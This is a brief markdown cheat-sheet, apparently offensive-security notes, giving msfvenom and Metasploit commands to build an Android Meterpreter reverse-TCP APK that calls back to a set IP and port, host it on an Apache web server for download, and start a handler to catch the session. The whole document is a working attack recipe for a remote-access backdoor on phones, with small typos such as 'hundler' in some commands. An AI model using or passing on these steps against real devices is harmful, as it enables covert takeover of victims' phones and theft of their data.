## Android - Msfvenom

```bash

msfvenom –p android/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=9009 R> /var/www/html/ehacking.apk

```
start apache

```bash
service apache2 start 
```

start msfconsole 

```bash
msf> use multi/hundler

msf> set payload android/meterpreter/reverse_tcp

msf> set LPORT 9009

msf> set LHOST <your ip>

msf> exploit 
```





